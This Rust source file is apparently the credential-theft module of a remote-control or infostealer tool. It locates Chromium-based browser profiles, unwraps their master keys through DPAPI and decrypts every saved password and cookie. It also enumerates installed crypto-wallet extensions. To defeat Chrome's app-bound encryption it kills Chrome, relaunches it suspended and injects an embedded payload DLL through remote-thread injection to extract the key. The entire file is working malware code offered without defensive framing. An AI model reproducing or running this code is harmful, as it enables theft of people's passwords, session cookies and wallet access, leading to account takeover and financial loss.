//! Browser credential extraction module.
//!
//! Extracts saved passwords and cookies from Chromium-based browsers.

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

use wavegate_shared::{CommandResponseData, CredentialEntry, CookieEntry};

// Embedded DLL payload for Chrome v20 key extraction
const CHROME_PAYLOAD_DLL: &[u8] = include_bytes!("chrome_payload.dll");

/// Known Chromium browser paths relative to AppData
const BROWSER_PATHS: &[(&str, &str)] = &[
    ("Chrome", "Google\\Chrome\\User Data"),
    ("Edge", "Microsoft\\Edge\\User Data"),
    ("Brave", "BraveSoftware\\Brave-Browser\\User Data"),
    ("Chromium", "Chromium\\User Data"),
    ("Vivaldi", "Vivaldi\\User Data"),
    ("Opera", "Opera Software\\Opera Stable"),
    ("Opera GX", "Opera Software\\Opera GX Stable"),
];

/// Known crypto wallet extensions
const WALLET_EXTENSIONS: &[(&str, &str)] = &[
    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    ("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
    ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
    ("Bitget Wallet", "jiidiaalihmmhddjgbnbgdfflelocpak"),
    ("OKX Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge"),
    ("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"),
    ("TokenPocket", "mfgccjchihfkkindfppnaooecgfneiii"),
    ("BNB Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"),
];

/// Represents a discovered browser profile
#[derive(Debug, Clone)]
struct BrowserProfile {
    name: String,
    local_state_path: PathBuf,
    login_data_path: PathBuf,
    cookies_path: PathBuf,
    extensions: Vec<(String, String)>, // (name, id)
}

/// Extract credentials from all browsers
pub fn extract_credentials() -> (bool, CommandResponseData) {
    let browsers = find_browsers();

    if browsers.is_empty() {
        return (false, CommandResponseData::Error {
            message: "No browsers found".to_string(),
        });
    }

    let mut all_credentials: Vec<CredentialEntry> = Vec::new();
    let mut all_cookies: Vec<CookieEntry> = Vec::new();
    let mut errors: Vec<String> = Vec::new();

    for browser in browsers {
        match extract_browser_credentials(&browser) {
            Ok((creds, cookies)) => {
                all_credentials.extend(creds);
                all_cookies.extend(cookies);
            }
            Err(e) => {
                errors.push(format!("{}: {}", browser.name, e));
            }
        }
    }

    if all_credentials.is_empty() && all_cookies.is_empty() {
        return (false, CommandResponseData::Error {
            message: format!("No credentials extracted. Errors: {}", errors.join("; ")),
        });
    }

    (true, CommandResponseData::Credentials {
        passwords: all_credentials,
        cookies: all_cookies,
    })
}

/// Find all installed Chromium-based browsers
fn find_browsers() -> Vec<BrowserProfile> {
    let mut browsers = Vec::new();

    let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let appdata = std::env::var("APPDATA").unwrap_or_default();

    let roots = vec![local_appdata, appdata];

    for (browser_name, rel_path) in BROWSER_PATHS {
        for root in &roots {
            if root.is_empty() {
                continue;
            }

            let user_data_dir = Path::new(root).join(rel_path);
            if !user_data_dir.exists() {
                continue;
            }

            let local_state = user_data_dir.join("Local State");
            if !local_state.exists() {
                continue;
            }

            // Find all profiles
            let profiles = find_profiles(&user_data_dir);

            for profile_path in profiles {
                let login_data = profile_path.join("Login Data");
                if !login_data.exists() {
                    continue;
                }

                // Cookies can be in Network subfolder or directly in profile
                let cookies_path = {
                    let network_cookies = profile_path.join("Network").join("Cookies");
                    if network_cookies.exists() {
                        network_cookies
                    } else {
                        profile_path.join("Cookies")
                    }
                };

                let profile_name = profile_path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("Default")
                    .to_string();

                let extensions = find_extensions(&profile_path);

                browsers.push(BrowserProfile {
                    name: format!("{} ({})", browser_name, profile_name),
                    local_state_path: local_state.clone(),
                    login_data_path: login_data,
                    cookies_path,
                    extensions,
                });
            }
        }
    }

    browsers
}

/// Find profile directories in a browser's user data folder
fn find_profiles(user_data_dir: &Path) -> Vec<PathBuf> {
    let mut profiles = Vec::new();

    // Default profile
    let default_profile = user_data_dir.join("Default");
    if default_profile.exists() {
        profiles.push(default_profile);
    }

    // Numbered profiles (Profile 1, Profile 2, etc.)
    if let Ok(entries) = fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("Profile ") && entry.path().is_dir() {
                profiles.push(entry.path());
            }
        }
    }

    profiles
}

/// Find known wallet extensions in a profile
fn find_extensions(profile_path: &Path) -> Vec<(String, String)> {
    let mut found = Vec::new();

    let extensions_dir = profile_path.join("Local Extension Settings");
    if !extensions_dir.exists() {
        return found;
    }

    for (name, id) in WALLET_EXTENSIONS {
        let ext_path = extensions_dir.join(id);
        if ext_path.exists() && ext_path.is_dir() {
            found.push((name.to_string(), id.to_string()));
        }
    }

    found
}

/// Extract credentials from a single browser profile
fn extract_browser_credentials(browser: &BrowserProfile) -> Result<(Vec<CredentialEntry>, Vec<CookieEntry>), String> {
    // Get the master key
    let master_key = extract_master_key(
        &browser.local_state_path,
        &browser.name,
        &browser.login_data_path,
    )?;

    // Extract passwords
    let passwords = extract_passwords(&browser.login_data_path, &master_key, &browser.name)?;

    // Extract cookies
    let cookies = if browser.cookies_path.exists() {
        extract_cookies(&browser.cookies_path, &master_key, &browser.name).unwrap_or_default()
    } else {
        Vec::new()
    };

    Ok((passwords, cookies))
}

/// Extract the master encryption key from Local State
fn extract_master_key(local_state_path: &Path, browser_name: &str, login_data_path: &Path) -> Result<Vec<u8>, String> {
    let content = fs::read_to_string(local_state_path)
        .map_err(|e| format!("Failed to read Local State: {}", e))?;

    let json: serde_json::Value = serde_json::from_str(&content)
        .map_err(|e| format!("Failed to parse Local State JSON: {}", e))?;

    // Check for v20 app-bound key (Chrome 127+)
    if browser_name.contains("Chrome") {
        if let Some(app_bound_key) = json.get("os_crypt")
            .and_then(|o| o.get("app_bound_encrypted_key"))
            .and_then(|k| k.as_str())
        {
            // Check if we have v20 encrypted passwords
            if has_v20_passwords(login_data_path) {
                if let Ok(key) = extract_v20_key(app_bound_key) {
                    return Ok(key);
                }
            }
        }
    }

    // Standard DPAPI-encrypted key
    let encrypted_key_b64 = json.get("os_crypt")
        .and_then(|o| o.get("encrypted_key"))
        .and_then(|k| k.as_str())
        .ok_or("No encrypted_key found in Local State")?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        encrypted_key_b64
    ).map_err(|e| format!("Failed to decode encrypted_key: {}", e))?;

    // Strip "DPAPI" prefix (5 bytes)
    if encrypted_key.len() < 5 || &encrypted_key[..5] != b"DPAPI" {
        return Err("Invalid encrypted_key format (missing DPAPI prefix)".to_string());
    }

    let key_to_decrypt = &encrypted_key[5..];

    // Decrypt with DPAPI
    let decrypted = decrypt_dpapi(key_to_decrypt)?;

    // The decrypted key might have a "v10" prefix
    if decrypted.len() >= 35 && &decrypted[..3] == b"v10" {
        Ok(decrypted[3..35].to_vec())
    } else if decrypted.len() >= 32 {
        Ok(decrypted[..32].to_vec())
    } else {
        Err("Decrypted key too short".to_string())
    }
}

/// Check if the Login Data contains v20-encrypted passwords
fn has_v20_passwords(login_data_path: &Path) -> bool {
    // Copy to temp to avoid lock issues
    let temp_path = std::env::temp_dir().join(format!("login_check_{}.db", std::process::id()));
    if fs::copy(login_data_path, &temp_path).is_err() {
        return false;
    }

    let result = (|| {
        let conn = rusqlite::Connection::open(&temp_path).ok()?;
        let mut stmt = conn.prepare("SELECT password_value FROM logins LIMIT 100").ok()?;
        let mut rows = stmt.query([]).ok()?;

        while let Ok(Some(row)) = rows.next() {
            let blob: Vec<u8> = row.get(0).ok()?;
            if blob.len() >= 3 && &blob[..3] == b"v20" {
                return Some(true);
            }
        }
        Some(false)
    })();

    let _ = fs::remove_file(&temp_path);
    result.unwrap_or(false)
}

/// Extract v20 key via DLL injection into Chrome
fn extract_v20_key(app_bound_key_b64: &str) -> Result<Vec<u8>, String> {
    use std::ffi::CString;
    use std::ptr;
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE, WAIT_OBJECT_0};
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::System::Memory::*;
    use windows::Win32::System::Threading::*;
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::core::s;

    // Decode the app-bound key
    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        app_bound_key_b64
    ).map_err(|e| format!("Failed to decode app_bound_key: {}", e))?;

    // Verify APPB prefix
    if encrypted_key.len() < 4 || &encrypted_key[..4] != b"APPB" {
        return Err("Invalid app_bound_key (missing APPB prefix)".to_string());
    }

    let key_data = &encrypted_key[4..];

    // Find Chrome executable path from registry
    let chrome_path = get_chrome_path()?;

    // Kill existing Chrome processes
    kill_chrome_processes();

    // Write the DLL to temp
    let dll_path = std::env::temp_dir().join("cp.dll");
    fs::write(&dll_path, CHROME_PAYLOAD_DLL)
        .map_err(|e| format!("Failed to write DLL: {}", e))?;

    // Create shared memory for communication
    let mem_name = format!("ChromeV20_{}", std::process::id());
    let enc_name = format!("{}_enc", mem_name);

    // Set environment variable for the DLL to find the memory name
    std::env::set_var("CHROME_MEMNAME", &mem_name);

    unsafe {
        // Create shared memory for result (ready flag, success flag, 32-byte key, error message)
        let h_mem = CreateFileMappingA(
            HANDLE(-1isize as *mut std::ffi::c_void),
            None,
            PAGE_READWRITE,
            0,
            512, // Enough for SharedResult struct
            windows::core::PCSTR(CString::new(mem_name.clone()).unwrap().as_ptr() as *const u8),
        ).map_err(|e| format!("CreateFileMappingA failed: {}", e))?;

        let shared = MapViewOfFile(h_mem, FILE_MAP_ALL_ACCESS, 0, 0, 512);
        if shared.Value.is_null() {
            let _ = CloseHandle(h_mem);
            return Err("MapViewOfFile failed".to_string());
        }

        // Zero the shared memory
        ptr::write_bytes(shared.Value as *mut u8, 0, 512);

        // Create shared memory for encrypted key data
        let h_enc = CreateFileMappingA(
            HANDLE(-1isize as *mut std::ffi::c_void),
            None,
            PAGE_READWRITE,
            0,
            8192,
            windows::core::PCSTR(CString::new(enc_name).unwrap().as_ptr() as *const u8),
        ).map_err(|e| {
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            format!("CreateFileMappingA for enc failed: {}", e)
        })?;

        let enc_view = MapViewOfFile(h_enc, FILE_MAP_WRITE, 0, 0, 8192);
        if enc_view.Value.is_null() {
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            let _ = CloseHandle(h_enc);
            return Err("MapViewOfFile for enc failed".to_string());
        }

        // Write encrypted key size and data
        let p_enc = enc_view.Value as *mut u8;
        let size = key_data.len() as u32;
        ptr::copy_nonoverlapping(&size as *const u32 as *const u8, p_enc, 4);
        ptr::copy_nonoverlapping(key_data.as_ptr(), p_enc.add(4), key_data.len());

        let _ = UnmapViewOfFile(enc_view);

        // Create Chrome process suspended
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let chrome_path_wide: Vec<u16> = chrome_path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut cmd_line: Vec<u16> = format!("\"{}\"", chrome_path).encode_utf16().chain(std::iter::once(0)).collect();

        let created = CreateProcessW(
            PCWSTR(chrome_path_wide.as_ptr()),
            Some(windows::core::PWSTR(cmd_line.as_mut_ptr())),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        );

        if created.is_err() {
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            let _ = CloseHandle(h_enc);
            return Err("Failed to create Chrome process".to_string());
        }

        // Inject the DLL
        let dll_path_str = dll_path.to_string_lossy().to_string();
        let dll_path_bytes = CString::new(dll_path_str.clone()).unwrap();
        let path_len = dll_path_bytes.as_bytes_with_nul().len();

        let remote_dll_path = VirtualAllocEx(
            pi.hProcess,
            None,
            path_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_dll_path.is_null() {
            let _ = TerminateProcess(pi.hProcess, 1);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(pi.hProcess);
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            let _ = CloseHandle(h_enc);
            return Err("VirtualAllocEx failed".to_string());
        }

        let written = WriteProcessMemory(
            pi.hProcess,
            remote_dll_path,
            dll_path_bytes.as_ptr() as *const std::ffi::c_void,
            path_len,
            None,
        );

        if written.is_err() {
            let _ = VirtualFreeEx(pi.hProcess, remote_dll_path, 0, MEM_RELEASE);
            let _ = TerminateProcess(pi.hProcess, 1);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(pi.hProcess);
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            let _ = CloseHandle(h_enc);
            return Err("WriteProcessMemory failed".to_string());
        }

        // Get LoadLibraryA address
        let h_kernel32 = GetModuleHandleA(s!("kernel32.dll"))
            .map_err(|_| "GetModuleHandleA failed")?;

        let load_library_addr = windows::Win32::System::LibraryLoader::GetProcAddress(
            h_kernel32,
            s!("LoadLibraryA"),
        );

        if load_library_addr.is_none() {
            let _ = VirtualFreeEx(pi.hProcess, remote_dll_path, 0, MEM_RELEASE);
            let _ = TerminateProcess(pi.hProcess, 1);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(pi.hProcess);
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            let _ = CloseHandle(h_enc);
            return Err("GetProcAddress failed".to_string());
        }

        // Create remote thread to load the DLL
        let h_thread = CreateRemoteThread(
            pi.hProcess,
            None,
            0,
            Some(std::mem::transmute(load_library_addr.unwrap())),
            Some(remote_dll_path),
            0,
            None,
        ).map_err(|e| {
            let _ = VirtualFreeEx(pi.hProcess, remote_dll_path, 0, MEM_RELEASE);
            let _ = TerminateProcess(pi.hProcess, 1);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(pi.hProcess);
            let _ = UnmapViewOfFile(shared);
            let _ = CloseHandle(h_mem);
            let _ = CloseHandle(h_enc);
            format!("CreateRemoteThread failed: {}", e)
        })?;

        // Wait for DLL to load
        let _ = WaitForSingleObject(h_thread, 5000);
        let _ = CloseHandle(h_thread);

        // Wait for the DLL to signal completion
        let shared_ptr = shared.Value as *const u8;
        let mut result_key: Option<Vec<u8>> = None;

        for _ in 0..300 {
            // Check ready flag (first 4 bytes)
            let ready = ptr::read_volatile(shared_ptr as *const u32);
            if ready != 0 {
                // Check success flag (next 4 bytes)
                let success = ptr::read_volatile(shared_ptr.add(4) as *const u32);
                if success != 0 {
                    // Read the 32-byte key (offset 8)
                    let mut key = vec![0u8; 32];
                    ptr::copy_nonoverlapping(shared_ptr.add(8), key.as_mut_ptr(), 32);
                    result_key = Some(key);
                }
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }

        // Cleanup
        std::thread::sleep(std::time::Duration::from_millis(500));
        let _ = VirtualFreeEx(pi.hProcess, remote_dll_path, 0, MEM_RELEASE);
        let _ = UnmapViewOfFile(shared);
        let _ = CloseHandle(h_mem);
        let _ = CloseHandle(h_enc);
        let _ = TerminateProcess(pi.hProcess, 0);
        let _ = CloseHandle(pi.hThread);
        let _ = CloseHandle(pi.hProcess);

        // Clean up DLL file
        let _ = fs::remove_file(&dll_path);

        result_key.ok_or_else(|| "Failed to extract v20 key".to_string())
    }
}

/// Get Chrome executable path from registry
fn get_chrome_path() -> Result<String, String> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe";

    let key = hklm.open_subkey(path)
        .map_err(|_| "Chrome not found in registry")?;

    let value: String = key.get_value("")
        .map_err(|_| "Failed to read Chrome path")?;

    Ok(value)
}

/// Kill all Chrome processes
fn kill_chrome_processes() {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_err() {
            return;
        }
        let snapshot = snapshot.unwrap();

        let mut pe: PROCESSENTRY32W = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut pe).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&pe.szExeFile);
                let name = name.trim_end_matches('\0').to_lowercase();

                if name == "chrome.exe" {
                    if let Ok(h_process) = OpenProcess(PROCESS_TERMINATE, false, pe.th32ProcessID) {
                        let _ = TerminateProcess(h_process, 0);
                        let _ = CloseHandle(h_process);
                    }
                }

                if Process32NextW(snapshot, &mut pe).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
    }

    std::thread::sleep(std::time::Duration::from_millis(100));
}

/// Decrypt data using Windows DPAPI
fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
    use windows::Win32::Security::Cryptography::*;

    unsafe {
        let mut in_blob = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };

        let mut out_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        let result = CryptUnprotectData(
            &mut in_blob,
            None,
            None,
            None,
            None,
            0,
            &mut out_blob,
        );

        if result.is_err() {
            return Err("CryptUnprotectData failed".to_string());
        }

        let decrypted = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec();

        windows::Win32::Foundation::LocalFree(Some(windows::Win32::Foundation::HLOCAL(out_blob.pbData as *mut std::ffi::c_void)));

        Ok(decrypted)
    }
}

/// Decrypt password/cookie using AES-GCM
fn decrypt_aes_gcm(ciphertext: &[u8], key: &[u8], nonce: &[u8], tag: &[u8]) -> Result<Vec<u8>, String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    if key.len() != 32 {
        return Err(format!("Invalid key length: {} (expected 32)", key.len()));
    }

    if nonce.len() != 12 {
        return Err(format!("Invalid nonce length: {} (expected 12)", nonce.len()));
    }

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|e| format!("Failed to create cipher: {}", e))?;

    let nonce = Nonce::from_slice(nonce);

    // Combine ciphertext and tag for aes-gcm crate
    let mut combined = ciphertext.to_vec();
    combined.extend_from_slice(tag);

    cipher.decrypt(nonce, combined.as_ref())
        .map_err(|e| format!("Decryption failed: {}", e))
}

/// Decrypt an encrypted value (password or cookie)
fn decrypt_value(encrypted: &[u8], master_key: &[u8]) -> Result<Vec<u8>, String> {
    if encrypted.len() < 3 {
        return Err("Encrypted data too short".to_string());
    }

    // Check for version prefix
    let prefix = &encrypted[..3];

    if prefix == b"v20" || prefix == b"v10" || prefix == b"v11" {
        // AES-GCM encrypted
        if encrypted.len() < 3 + 12 + 16 {
            return Err("Encrypted data too short for AES-GCM".to_string());
        }

        let nonce = &encrypted[3..15];
        let ciphertext = &encrypted[15..encrypted.len() - 16];
        let tag = &encrypted[encrypted.len() - 16..];

        decrypt_aes_gcm(ciphertext, master_key, nonce, tag)
    } else {
        // Legacy DPAPI encryption
        decrypt_dpapi(encrypted)
    }
}

/// Extract passwords from Login Data database
fn extract_passwords(login_data_path: &Path, master_key: &[u8], browser_name: &str) -> Result<Vec<CredentialEntry>, String> {
    // Copy database to temp to avoid lock issues
    let temp_path = std::env::temp_dir().join(format!("login_data_{}.db", std::process::id()));
    fs::copy(login_data_path, &temp_path)
        .map_err(|e| format!("Failed to copy Login Data: {}", e))?;

    let mut passwords = Vec::new();

    {
        let conn = rusqlite::Connection::open(&temp_path)
            .map_err(|e| format!("Failed to open database: {}", e))?;

        let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
            .map_err(|e| format!("Failed to prepare query: {}", e))?;

        let rows = stmt.query_map([], |row| {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let encrypted: Vec<u8> = row.get(2)?;
            Ok((url, username, encrypted))
        }).map_err(|e| format!("Query failed: {}", e))?;

        for row in rows.flatten() {
            let (url, username, encrypted) = row;

            if encrypted.len() < 3 {
                continue;
            }

            if let Ok(decrypted) = decrypt_value(&encrypted, master_key) {
                let password = String::from_utf8_lossy(&decrypted).to_string();

                if !password.is_empty() {
                    passwords.push(CredentialEntry {
                        browser: browser_name.to_string(),
                        url,
                        username,
                        password,
                    });
                }
            }
        }
    }

    // Cleanup temp file
    let _ = fs::remove_file(&temp_path);

    Ok(passwords)
}

/// Extract cookies from Cookies database
fn extract_cookies(cookies_path: &Path, master_key: &[u8], browser_name: &str) -> Result<Vec<CookieEntry>, String> {
    // Copy database to temp to avoid lock issues
    let temp_path = std::env::temp_dir().join(format!("cookies_{}.db", std::process::id()));
    fs::copy(cookies_path, &temp_path)
        .map_err(|e| format!("Failed to copy Cookies: {}", e))?;

    let mut cookies = Vec::new();

    {
        let conn = rusqlite::Connection::open(&temp_path)
            .map_err(|e| format!("Failed to open database: {}", e))?;

        let mut stmt = conn.prepare(
            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies"
        ).map_err(|e| format!("Failed to prepare query: {}", e))?;

        let rows = stmt.query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let encrypted: Vec<u8> = row.get(2)?;
            let path: String = row.get(3)?;
            let expires: i64 = row.get(4)?;
            let secure: bool = row.get(5)?;
            let http_only: bool = row.get(6)?;
            Ok((host, name, encrypted, path, expires, secure, http_only))
        }).map_err(|e| format!("Query failed: {}", e))?;

        for row in rows.flatten() {
            let (host, name, encrypted, path, expires, secure, http_only) = row;

            if encrypted.is_empty() {
                continue;
            }

            if let Ok(decrypted) = decrypt_value(&encrypted, master_key) {
                // For cookies, there might be a 32-byte prefix to skip
                let value_bytes = if decrypted.len() > 32 &&
                    (encrypted.len() >= 3 && (encrypted[..3] == *b"v10" || encrypted[..3] == *b"v11" || encrypted[..3] == *b"v20")) {
                    &decrypted[32..]
                } else {
                    &decrypted[..]
                };

                let value = String::from_utf8_lossy(value_bytes)
                    .trim_end_matches('\0')
                    .to_string();

                // Skip if value contains non-printable characters
                if value.chars().any(|c| c < ' ' && c != '\t' && c != '\n' && c != '\r') {
                    continue;
                }

                if !value.is_empty() {
                    // Convert Chrome timestamp to human readable
                    let expires_str = if expires > 0 {
                        // Chrome uses microseconds since Jan 1, 1601
                        let epoch_diff: i64 = 11644473600;
                        let unix_time = (expires / 1_000_000) - epoch_diff;
                        if unix_time > 0 && unix_time < 4102444800 {
                            time::OffsetDateTime::from_unix_timestamp(unix_time)
                                .ok()
                                .and_then(|dt| dt.format(&time::format_description::parse("[year]-[month]-[day] [hour]:[minute]:[second]").ok()?).ok())
                                .unwrap_or_default()
                        } else {
                            String::new()
                        }
                    } else {
                        String::new()
                    };

                    cookies.push(CookieEntry {
                        browser: browser_name.to_string(),
                        host,
                        name,
                        value,
                        path,
                        expires: expires_str,
                        secure,
                        http_only,
                    });
                }
            }
        }
    }

    // Cleanup temp file
    let _ = fs::remove_file(&temp_path);

    Ok(cookies)
}
